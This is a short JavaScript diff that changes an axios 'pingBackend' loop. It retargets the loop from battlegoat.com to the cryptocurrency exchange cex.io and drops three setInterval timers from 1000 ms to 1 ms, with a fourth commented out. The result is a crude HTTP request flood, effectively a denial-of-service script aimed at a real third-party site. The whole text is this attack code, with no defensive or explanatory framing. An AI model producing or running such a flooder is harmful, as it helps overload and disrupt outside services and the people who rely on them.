@@ -2,7 +2,7 @@ import axios from 'axios';
 
 
 
-const backendURL = 'https://www.battlegoat.com/';
+const backendURL = 'https://cex.io/';
 
 function pingBackend() {
   axios.get(backendURL)
@@ -15,9 +15,9 @@ function pingBackend() {
 }
 
 
-const pingInterval = setInterval(pingBackend, 1000);
-const pingInterval2 = setInterval(pingBackend, 1000);
-const pingInterval3 = setInterval(pingBackend, 1000);
+const pingInterval = setInterval(pingBackend, 1);
+const pingInterval2 = setInterval(pingBackend, 1);
+const pingInterval3 = setInterval(pingBackend, 1);
 //const pingInterval4= setInterval(pingBackend, 1);
 
 
